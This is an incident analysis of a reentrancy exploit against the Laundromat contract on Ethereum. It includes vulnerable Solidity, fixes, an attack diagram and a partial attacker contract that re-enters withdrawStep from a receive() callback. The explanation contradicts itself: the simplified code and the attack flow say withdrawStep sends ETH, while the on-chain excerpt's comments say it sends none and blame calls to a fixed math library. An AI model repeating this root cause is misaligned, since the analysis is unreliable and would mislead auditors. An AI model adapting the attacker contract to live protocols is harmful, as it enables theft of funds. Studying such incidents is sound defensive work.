# Laundromat — Withdrawal Process Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2025-04-08 |
| **Protocol** | Laundromat |
| **Chain** | Ethereum |
| **Loss** | ~1,500 USD |
| **Attacker** | [0xd6be07499d408454d090c96bd74a193f61f706f4](https://etherscan.io/address/0xd6be07499d408454d090c96bd74a193f61f706f4) |
| **Attack Tx** | [0x08ffb5f7...](https://app.blocksec.com/explorer/tx/eth/0x08ffb5f7ab6421720ab609b6ab0ff5622fba225ba351119c21ef92c78cb8302c) |
| **Vulnerable Contract** | [0x934cbbe5377358e6712b5f041d90313d935c501c](https://etherscan.io/address/0x934cbbe5377358e6712b5f041d90313d935c501c) |
| **Root Cause** | Reentrancy possible in the multi-step withdrawal process (withdrawStart → withdrawStep → withdrawFinal) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/Laundromat_exp.sol) |

---

## 1. Vulnerability Overview

The Laundromat protocol processed funds via ETH deposits and a multi-step withdrawal process (`withdrawStart` → `withdrawStep` → `withdrawFinal`). During the multi-step withdrawal, a reentrancy attack was possible by exploiting the ETH transfer callback in intermediate steps. The attacker contract executed the attack from its constructor, repeatedly withdrawing by calling `withdrawStep()` again using ETH received at each step.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable withdrawal process: no reentrancy protection
contract Laundromat {
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public withdrawPhase;

    function withdrawStart(
        uint256[] calldata amounts,
        uint256 a, uint256 b, uint256 c
    ) external {
        // Initiate withdrawal (set phase)
        withdrawPhase[msg.sender] = 1;
    }

    function withdrawStep() external {
        require(withdrawPhase[msg.sender] >= 1);
        // ❌ ETH transfer before state update
        (bool success,) = msg.sender.call{value: STEP_AMOUNT}("");
        // ❌ Reentrancy possible at this point
        withdrawPhase[msg.sender]++; // Update is too late
    }

    function withdrawFinal() external returns (bool) {
        // Finalize withdrawal
    }
}

// ✅ Correct code
function withdrawStep() external nonReentrant { // ✅ Reentrancy protection
    require(withdrawPhase[msg.sender] >= 1);
    withdrawPhase[msg.sender]++; // ✅ Update state first
    (bool success,) = msg.sender.call{value: STEP_AMOUNT}(""); // ✅ Then transfer
}
```

### On-chain Source Code

Source: **Sourcify-verified** — Laundromat / 0x934cbbe5377358e6712b5f041d90313d935c501c (Ethereum)
https://sourcify.dev/server/files/any/1/0x934cbbe5377358e6712b5f041d90313d935c501c

```solidity
// Laundromat.sol — 0x934cbbe5377358e6712b5f041d90313d935c501c (Ethereum)
// Sourcify-verified

// --- State variables ---
address internal constant arithAddress = 0x600ad7b57f3e6aeee53acb8704a5ed50b60cacd6;
ArithLib private arithContract;
mapping(uint => WithdrawInfo) private withdraws;
mapping(uint => bool) private consumed;

uint public participants = 0;
uint public payment = 0;
uint public gotParticipants = 0;
uint[] public pubkeys1;
uint[] public pubkeys2;

function deposit(uint _pubkey1, uint _pubkey2) payable {
    if (gotParticipants >= participants) throw;  // no reentrancy guard
    pubkeys1.push(_pubkey1);
    pubkeys2.push(_pubkey2);
    gotParticipants++;
    // ❌ payment stored globally — ETH held by contract accessible to any participant
}

function withdrawStart(uint[] _signature, uint _x0, uint _Ix, uint _Iy) {
    if (gotParticipants < participants) throw;
    if (consumed[uint(sha3([_Ix, _Iy]))]) throw;

    WithdrawInfo withdraw = withdraws[uint(msg.sender)];
    withdraw.sender = msg.sender;
    withdraw.Ix = _Ix;
    withdraw.Iy = _Iy;
    withdraw.signature = _signature;

    withdraw.ring1.length = 0;
    withdraw.ring2.length = 0;
    withdraw.ring1.push(_x0);
    withdraw.ring2.push(uint(sha3(_x0)));

    withdraw.step = 1;    // ❌ step set to 1 — no limit on how many times withdrawStep can be re-entered
    withdraw.prevStep = 0;
}

function withdrawStep() {
    WithdrawInfo withdraw = withdraws[uint(msg.sender)];

    if (withdraw.step < 1) throw;
    if (withdraw.step > participants) throw;    // ❌ checked BEFORE state update — reentrancy window exists between check and update
    if (consumed[uint(sha3([withdraw.Ix, withdraw.Iy]))]) throw;

    // ... elliptic curve arithmetic to build ring signature verification arrays ...
    uint k1x; uint k1y; uint k1z; uint k2x; uint k2y; uint k2z; uint pub1x; uint pub1y;

    (k1x, k1y, k1z) = arithContract.jmul(Gx, Gy, 1,
        withdraw.signature[withdraw.prevStep % participants]);
    (k2x, k2y, k2z) = arithContract.jmul(
        pubkeys1[withdraw.step % participants],
        pubkeys2[withdraw.step % participants], 1,
        withdraw.ring2[withdraw.prevStep % participants]);
    (k1x, k1y, k1z) = arithContract.jsub(k1x, k1y, k1z, k2x, k2y, k2z);
    (pub1x, pub1y) = arithContract.jdecompose(k1x, k1y, k1z);
    (k1x, k1y) = arithContract.hash_pubkey_to_pubkey(
        pubkeys1[withdraw.step % participants],
        pubkeys2[withdraw.step % participants]);
    (k1x, k1y, k1z) = arithContract.jmul(k1x, k1y, 1,
        withdraw.signature[withdraw.prevStep % participants]);
    (k2x, k2y, k2z) = arithContract.jmul(withdraw.Ix, withdraw.Iy, 1,
        withdraw.ring2[withdraw.prevStep % participants]);
    (k1x, k1y, k1z) = arithContract.jsub(k1x, k1y, k1z, k2x, k2y, k2z);
    (k1x, k1y) = arithContract.jdecompose(k1x, k1y, k1z);

    withdraw.ring1.push(uint(sha3([uint(withdraw.sender), pub1x, pub1y, k1x, k1y])));
    withdraw.ring2.push(uint(sha3(uint(sha3([uint(withdraw.sender), pub1x, pub1y, k1x, k1y])))));
    withdraw.step++;        // ❌ step incremented AFTER all computation — no nonReentrant guard
    withdraw.prevStep++;
    // ❌ ETH is NOT sent here, but arithContract.jmul / jsub are external calls
    // ❌ those external calls allow reentrancy before withdraw.step is fully incremented
}

function withdrawFinal() returns (bool) {
    WithdrawInfo withdraw = withdraws[uint(msg.sender)];

    if (withdraw.step != (participants + 1)) throw;
    if (consumed[uint(sha3([withdraw.Ix, withdraw.Iy]))]) throw;
    if (withdraw.ring1[participants] != withdraw.ring1[0]) {
        LogDebug("Wrong signature");
        return false;
    }
    if (withdraw.ring2[participants] != withdraw.ring2[0]) {
        LogDebug("Wrong signature");
        return false;
    }

    withdraw.step++;
    consumed[uint(sha3([withdraw.Ix, withdraw.Iy]))] = true;
    safeSend(withdraw.sender, payment);   // ❌ sends ETH last — but consumed flag set just before, so direct reentrancy in withdrawFinal is limited; main reentrancy is via withdrawStep's external arithmetic calls
    return true;
}
```

**Why it is exploitable (identify the bug from the code):**

- `withdrawStep()` makes external calls to `arithContract.jmul()` and `arithContract.jsub()` (the `ArithLib` elliptic curve library at `0x600ad7...`) **before** `withdraw.step` is fully incremented.
- There is no `nonReentrant` guard on any of `withdrawStart`, `withdrawStep`, or `withdrawFinal`.
- An attacker contract can re-enter `withdrawStep()` from within those external arithmetic library calls, advancing its own `withdraw.step` counter independently and satisfying the `participants + 1` check in `withdrawFinal()` multiple times across reentrant calls.
- `consumed` is only set in `withdrawFinal` — so the same key image (`[Ix, Iy]`) can be used to trigger multiple `safeSend(sender, payment)` calls before the first one marks the key image as consumed.

```solidity
// ✅ Fix: add reentrancy guard and follow CEI pattern
bool private locked;
modifier nonReentrant() {
    require(!locked, "reentrant call");
    locked = true;
    _;
    locked = false;
}

function withdrawStep() nonReentrant {  // ✅ blocks reentry
    // ... arithmetic unchanged ...
    withdraw.step++;    // ✅ state updated before any ETH transfer
    withdraw.prevStep++;
}

function withdrawFinal() nonReentrant returns (bool) {
    // ... validation unchanged ...
    withdraw.step++;
    consumed[uint(sha3([withdraw.Ix, withdraw.Iy]))] = true;  // ✅ mark consumed first
    safeSend(withdraw.sender, payment);                        // ✅ send ETH last
    return true;
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract (attack executed from constructor)
  │
  ├─[1]─► Call Laundromat.deposit() (deposit small amount of ETH)
  │
  ├─[2]─► Call Laundromat.withdrawStart([amounts], ...)
  │         └─► Initiate withdrawal process
  │
  ├─[3]─► First call to Laundromat.withdrawStep()
  │         └─► ETH sent to contract → receive() callback triggered
  │                                          │
  ├─[4]◄─────────────────────────────────────┘
  │         └─► Re-enter withdrawStep() from receive()
  │               └─► Receive additional ETH
  │               └─► Recursively repeats...
  │
  ├─[5]─► Call Laundromat.withdrawFinal()
  │
  └─[6]─► Loss: ~1,500 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// 0x2E95CFC93EBb0a2aACE603ed3474d451E4161578
contract AttackerC {
    constructor() {
        // [1] Deposit
        (bool s1,) = Laundromat.call{value: DEPOSIT_AMOUNT}(
            abi.encodeWithSignature("deposit(uint256,uint256)", ...)
        );
        require(s1);

        // [2] Initiate withdrawal
        (bool s2,) = Laundromat.call(
            abi.encodeWithSignature("withdrawStart(uint256[],uint256,uint256,uint256)", ...)
        );
        require(s2);

        // [3] First withdrawStep call (triggers reentrancy chain)
        (bool s3,) = Laundromat.call(
            abi.encodeWithSignature("withdrawStep()")
        );
        require(s3);

        // [6] Final withdrawal
        (bool sf,) = Laundromat.call(
            abi.encodeWithSignature("withdrawFinal()")
        );
        require(sf);
    }

    // Execute reentrancy attack upon receiving ETH
    receive() external payable {
        // [4] Reenter: call additional withdrawStep
        if (address(Laundromat).balance > 0) {
            (bool ss,) = Laundromat.call(
                abi.encodeWithSignature("withdrawStep()")
            );
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Reentrancy Attack |
| **Attack Technique** | Multi-step reentrancy via ETH transfer callback |
| **DASP Category** | Reentrancy |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Severity** | Medium |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Apply ReentrancyGuard**: Apply the `nonReentrant` modifier to all withdrawal-related functions.
2. **CEI Pattern**: Update state variables before making external calls.
3. **Pull Payment Pattern**: Instead of pushing ETH directly, use a pattern where users withdraw funds themselves.

## 7. Lessons Learned

- **Risk of multi-step withdrawals**: In withdrawal processes divided into multiple steps, reentrancy possibilities must be evaluated at each step.
- **Constructor-based attacks**: Attackers can execute the attack from the contract constructor to complicate analysis.
- **Small losses are still worth analyzing for patterns**: Although the loss was $1,500, the same pattern in a larger protocol could cause millions of dollars in damage.